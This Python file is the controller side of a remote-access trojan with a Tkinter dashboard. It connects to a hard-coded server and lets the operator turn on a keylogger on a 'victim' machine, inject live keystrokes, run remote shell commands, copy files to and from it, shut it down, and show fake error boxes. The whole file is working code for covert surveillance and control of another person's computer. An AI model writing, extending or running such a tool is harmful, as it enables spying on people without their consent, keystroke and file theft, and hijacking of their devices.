import socket
import threading
from tkinter import *
from pynput.keyboard import Key, Listener, Controller
import keyboard
from tkinter import filedialog

#Vars
buttons = []
specialButtons = []
livetypeOn = False
keyloggerOn = False

Nickname = ""
#login screen
def initializeConnection():
    global loginwin, Nickname
    Nickname = entry.get()
    loginwin.destroy()

def login():
    global loginwin, entry
    loginwin = Tk()

    label = Label(loginwin, text="Nickname")
    label.grid(row=0, column=0, sticky="NW")

    entry = Entry(loginwin)
    entry.grid(row=0, column=1, columnspan=3, sticky="NE")

    button = Button(loginwin, text="Connect", command=initializeConnection)
    button.grid(row=1, column=0, columnspan=4)

    loginwin.mainloop()

login()

#Sockets & networking code
format = "utf-8"
CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
CHATSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
FILESOCKET = socket.socket()
IP = socket.gethostbyname(socket.gethostname())
IP = "192.168.1.69"
COMMANDSPORT = 8080
FILESOCKETPORT = 9090
CHATPORT = 9191
CLIENT.connect((IP, COMMANDSPORT))
CHATSOCKET.connect((IP, CHATPORT))
FILESOCKET.connect((IP, FILESOCKETPORT))
CHATSOCKET.send(Nickname.encode(format))

def recievingMessages():
    global messageIndex, livetypeOn, keyloggerOn
    while True:
        message = CLIENT.recv(1024).decode(format)
        print(message)
        #commands for sync
        if "?exitlivetype" in message:
            print("off")
            livetypeOn = False
            keyboard.press("esc")
            buttonsConfig("ENABLE")
            specialButtonConfig("ENABLE")

        elif "livetypeOn" in message:
            livetypeOn = True
            buttonsConfig("DISABLE")
            specialButtonConfig("LIVETYPE")
        
        elif "keyloggerOn" in message:
            keyloggerOn = True
            specialButtonConfig("KEYLOGGER")

        elif "keyloggerOff" in message:
            keyloggerOn = False
            specialButtonConfig("ENABLE")

        elif "?cmdresult" in message:
            output = message[message.index("/") + 1:]
            messageBox.see(END)
            messageBox.insert(END, output)
            messageBox.see(END)

        else:
            output = ""
            if "/" in message:
                output = message[message.index("/") + 1:]
            else:
                output = message
            console.see(END)
            console.insert(END, output)
            console.see(END)

def receiveChat():
    while True:
        message = CHATSOCKET.recv(1024).decode(format)
        chatbox.see(END)
        chatbox.insert(END, message)
        chatbox.see(END)

def sendMessage(message):
    CLIENT.send(message.encode(format))


messageListener = threading.Thread(target=recievingMessages).start()
chatListener = threading.Thread(target=receiveChat).start()


#UI & button funtionalities code


#Useful functions
def specialButtonConfig(tfdouwant):
    if tfdouwant == "DISABLE":
        for i in specialButtons:
            i.config(state=DISABLED, bg="gray")
    elif tfdouwant == "ENABLE":
        for i in specialButtons:
            i.config(state=NORMAL, bg="red")
    elif tfdouwant == "LIVETYPE":
        specialButtons[1].config(state=DISABLED, bg="gray")
    elif tfdouwant == "KEYLOGGER":
        specialButtons[0].config(state=DISABLED, bg="gray")

def buttonsConfig(tfdouwant):
    if tfdouwant == "DISABLE":
        for i in buttons:
            i.config(state=DISABLED, bg="gray")
    elif tfdouwant == "ENABLE":
        for i in buttons:
            i.config(state=NORMAL, bg="white")

def exitWindow(window):
    #used when the client exits a window from X
    window.destroy()
    buttonsConfig("ENABLE")

def livetypingButtonListener(key):
    global livetypeOn
    CLIENT.send(str(key).encode(format))
    if str(key) == "Key.esc":
        livetypeOn = False
        return False

def startbuttonListener():
    with Listener(on_press=livetypingButtonListener) as i:
        i.join()

#Funtions of Buttons
def volumeButtonCommand():
    global messageIndex
    try:
        #checking if the number entered is valid
        int(volumebox.get().strip())
        CLIENT.send(f"?Volume {volumebox.get()}".encode(format))
        buttonsConfig("ENABLE")
        volumewindow.destroy()
    except:
        console.see(END)
        console.insert(END, "Not a number")
        console.see(END)
        volumebox.delete(0, END)

def shutdownCommand():
    global messageIndex
    try:
        int(sdtimebox.get())
        CLIENT.send(f"?Shutdown {sdmessagebox.get()}/{sdtimebox.get()}".encode(format))
        buttonsConfig("ENABLE")
        shutdownwindow.destroy()
    except:
        console.see(END)
        console.insert(END, "Not a number")
        console.see(END)
        sdtimebox.delete(0, END)

def soundbuttonCommand():
    soundname = soundbox.get()
    if soundname != "":
        CLIENT.send(f"?play {Nickname}/{soundname}".encode(format))
        buttonsConfig("ENABLE")
        soundwindow.destroy()

def errorboxCommand():
    errortitle = errortitlebox.get()
    errormessage = errorbox.get()
    if errormessage != "" and errortitle != "":
        CLIENT.send(f"?errorbox {errortitle}/{errormessage}".encode(format))
        buttonsConfig("ENABLE")
        errorWindow.destroy()

def keyloggerCommand():
    global keyloggerOn
    if keyloggerOn == False:
        CLIENT.send("?keylogger on".encode(format))
        CLIENT.send("?public/keyloggerOn".encode(format))
        keyloggerOn = True
    elif keyloggerOn == True:
        CLIENT.send("?keylogger off".encode(format))
        CLIENT.send("?public/keyloggerOff".encode(format))
        keyloggerOn = False


def livetypeCommand():
    global livetypeOn
    if livetypeOn == False:
        CLIENT.send("?livetype on".encode(format))
        CLIENT.send("?public/livetypeOn".encode(format))
        livetypeOn = True
        thread = threading.Thread(target=startbuttonListener).start()
    elif livetypeOn == True:
        CLIENT.send("?livetype off".encode(format))
        livetypeOn = False

def cmdCommand(event):
    command = commandEntry.get()
    CLIENT.send(f"?cmdcommand {Nickname}/{command}".encode(format))
    # commandEntry.delete(0, END)

def filesend():
    dir = FileTransferedEntry.get()
    # directory = dir.replace("/", "\\")
    try:
        with open(dir, "rb") as f:
            CLIENT.send(f"?recieveFile {Nickname}/{FileSavedEntry.get()}".encode(format))
            while True:
                bytes_read = f.read(8192)
                print(bytes_read)
                if not bytes_read:
                    break
                FILESOCKET.sendall(bytes_read)
    except:
        console.see(END)
        console.insert(END, "The file request has failed recheck directories entered.")
        console.see(END)
def browseSaveDir():
    global FileSavedEntry
    saveDir = filedialog.askdirectory().replace("/", "\\")
    FileSavedEntry.delete(0, END)
    FileSavedEntry.insert(0, saveDir)


def fileRequest():
    global FileSavedEntry
    if FileSavedEntry.get().strip() != "":
        path = FileTransferedEntry.get()
        CLIENT.send(f"?requestfile {Nickname}/{path}".encode(format))
        with open(FileSavedEntry.get(), "wb") as f:
            FileSavedEntry.delete(0, END)
            FileTransferedEntry.delete(0, END)
            while True:
                FILESOCKET.settimeout(7.0)
                bytes_read = FILESOCKET.recv(8192)
                print(bytes_read)
                if not bytes_read:
                    break
                f.write(bytes_read)
    else:
        console.see(END)
        console.insert(END, "Save directory is empty.")
        console.see(END)

def chatSend(event):
    if chatboxEntry.get().strip() != "":
        message = Nickname + ": " + chatboxEntry.get()
        CHATSOCKET.send(message.encode(format))
        chatboxEntry.delete(0, END)

#GUI

def consoleWindow():
    global commandEntry, messageBox, FileSavedEntry, FileTransferedEntry
    consoleWindow = Tk()
    consoleWindow.bind("<Return>", cmdCommand)
    consoleWindow.geometry("950x500")
    consoleWindow.resizable(width=False, height=False)

    messageBox = Listbox(consoleWindow, width=100, height=25)
    messageBox.place(x=0, y=0)

    commandEntry = Entry(consoleWindow, width=88)
    commandEntry.place(x=0, y=420)

    #File Transfer
    FileTransferedLabel = Label(
        consoleWindow, text="File Transfered Directory:")
    FileTransferedLabel.place(x=720, y=130)

    FileTransferedEntry = Entry(consoleWindow, width=45)
    FileTransferedEntry.place(x=650, y=150)

    FileSavedLabel = Label(consoleWindow, text="File Saved Directory:")
    FileSavedLabel.place(x=720, y=180)

    FileSavedEntry = Entry(consoleWindow, width=45)
    FileSavedEntry.place(x=650, y=200)

    browseButton = Button(consoleWindow, text="browse", command=browseSaveDir)
    browseButton.place(x=850, y=240)

    submitButton = Button(consoleWindow, text="Submit for client", command=fileRequest)
    submitButton.place(x=750, y=240)

    submitButton = Button(consoleWindow, text="Submit for victim", command=filesend)
    submitButton.place(x=650, y=240)

    consoleWindow.mainloop()

def errorboxWindow():
    global errorWindow, errortitlebox, errorbox
    buttonsConfig("DISABLE")
    errorWindow = Tk()
    errorWindow.protocol("WM_DELETE_WINDOW", lambda: exitWindow(errorWindow))
    errorWindow.geometry('200x100')
    errorWindow.resizable(width=False, height=False)

    errortitleLabel = Label(errorWindow, text="Title:")
    errortitleLabel.place(x=4, y=10)
    errortitlebox = Entry(errorWindow, width=20)
    errortitlebox.place(x=58, y=10)

    errormsgLabel = Label(errorWindow, text="Message:")
    errormsgLabel.place(x=4, y=30)
    errorbox = Entry(errorWindow, width=20)
    errorbox.place(x=58, y=30)

    errorconfirmbutton = Button(
        errorWindow, text='Confirm', width=6, height=1, command=errorboxCommand)
    errorconfirmbutton.place(x=40, y=55)

def playsoundWindow():
    global soundwindow, soundbox
    buttonsConfig("DISABLE")
    soundwindow = Tk()
    soundwindow.protocol("WM_DELETE_WINDOW", lambda: exitWindow(soundwindow))
    soundwindow.geometry('200x100')
    soundwindow.resizable(width=False, height=False)

    soundlabel = Label(soundwindow, text="Sound Name:")
    soundlabel.place(x=4, y=10)

    soundbox = Entry(soundwindow, width=20)
    soundbox.place(x=80, y=10)

    soundplaybutton = Button(soundwindow, text='Play',
                             width=6, height=1, command=soundbuttonCommand)
    soundplaybutton.place(x=65, y=50)


def volumeWindow():
    global volumewindow, volumebox
    buttonsConfig("DISABLE")

    volumewindow = Tk()
    volumewindow.protocol("WM_DELETE_WINDOW", lambda: exitWindow(volumewindow))
    volumewindow.geometry('100x100')
    volumewindow.resizable(width=False, height=False)

    volumelabel = Label(volumewindow, text="Volume:")
    volumelabel.place(x=4, y=10)
    volumebox = Entry(volumewindow, width=4)
    volumebox.place(x=58, y=10)

    volumeconfirmbutton = Button(
        volumewindow, text='Change', width=6, height=1, command=volumeButtonCommand)
    volumeconfirmbutton.place(x=20, y=50)

def shutdownWindow():
    global shutdownwindow, sdmessagebox, sdtimebox
    buttonsConfig("DISABLE")
    shutdownwindow = Tk()
    shutdownwindow.protocol("WM_DELETE_WINDOW", lambda: exitWindow(shutdownwindow))
    shutdownwindow.geometry('200x150')
    shutdownwindow.resizable(width=False, height=False)

    sdmessagelabel = Label(shutdownwindow, text="Message:")
    sdmessagelabel.place(x=4, y=10)
    sdmessagebox = Entry(shutdownwindow, width=20)
    sdmessagebox.place(x=58, y=10)

    sdtimelabel = Label(shutdownwindow, text="Time:")
    sdtimelabel.place(x=4, y=35)
    sdtimebox = Entry(shutdownwindow, width=8)
    sdtimebox.place(x=40, y=35)

    sdconfirmbutton = Button(shutdownwindow, text='Confirm',
                             width=6, height=1, command=shutdownCommand)
    sdconfirmbutton.place(x=70, y=120)


    
#dashboard
def dashBoard():
    global console, chatbox, chatboxEntry
    window = Tk()
    window.bind("<Return>", chatSend)
    window.title("Dashboard")
    window.geometry("800x600")

    volumeChanger = Button(window, text="Volume Changer",
                           width=20, height=8, command=volumeWindow)
    volumeChanger.grid(row=0, column=0)

    shutdown = Button(window, text="Shutdown Laptop",
                      width=20, height=8, command=shutdownWindow)
    shutdown.grid(row=0, column=1)

    playsound = Button(window, text="Play Sound", width=20,
                       height=8, command=playsoundWindow)
    playsound.grid(row=0, column=2)

    errorbox = Button(window, text="Error Box", width=20,
                      height=8, command=errorboxWindow)
    errorbox.grid(row=1, column=0)


    #special buttons
    keylogger = Button(window, text="Keylogger", bg="red", activebackground='red',
                       width=20, height=8, command=keyloggerCommand)
    keylogger.grid(row=1, column=1)

    livetyping = Button(window, text="Live Type", bg="red", activebackground="red",
                        width=20, height=8, command=livetypeCommand)
    livetyping.grid(row=1, column=2)

    buttonConsoleseperator = Label(text="", height=4)
    buttonConsoleseperator.grid(row=3, column=0)

    cmdconsole = Button(window, text="Console",
                            width=20, height=8, command=consoleWindow)
    cmdconsole.grid(row=2, column=0)

    chatbox = Listbox(window, width=30, height=5)
    chatbox.grid(row=0, column = 10, columnspan=3, rowspan=4, sticky="NS")

    chatboxEntry = Entry(window, width=30)
    chatboxEntry.grid(row=5, column=10, sticky="SW")

    console = Listbox(window)
    console.grid(row=3, column=0, columnspan=5, sticky="NW")
    console.config(width=100)

    #appending all buttens to the list
    buttons.append(volumeChanger)
    buttons.append(playsound)
    buttons.append(errorbox)
    buttons.append(shutdown)

    specialButtons.append(livetyping)
    specialButtons.append(keylogger)

    window.mainloop()



dashBoard()